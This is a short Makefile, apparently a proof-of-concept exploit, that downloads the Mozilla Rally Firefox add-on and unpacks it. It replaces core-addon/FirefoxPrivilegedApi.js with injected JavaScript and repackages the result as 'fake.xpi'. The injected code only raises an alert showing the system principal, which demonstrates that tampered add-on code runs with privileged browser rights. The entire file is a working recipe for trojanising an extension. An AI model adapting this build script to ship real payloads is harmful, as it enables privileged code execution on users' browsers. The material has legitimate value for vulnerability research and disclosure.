url = https://addons.mozilla.org/firefox/downloads/file/3892089/mozilla_rally-1.4.1buildid20220111.145016-fx.xpi
payload_dest = core-addon/FirefoxPrivilegedApi.js
payload = \
	const { Services } = ChromeUtils.import("resource://gre/modules/Services.jsm"); \
	Services.prompt.alert(null, "", Services.scriptSecurityManager.getSystemPrincipal().origin);

all: real.xpi fake.xpi
real.xpi:
	wget -O real.xpi $(url)
fake.xpi: real.xpi
	unzip -u -d fake real.xpi
	echo '$(payload)' > fake/$(payload_dest)
	(cd fake && zip -r ../fake.xpi .)
	rm -rf fake/
clean:
	rm -f real.xpi fake.xpi
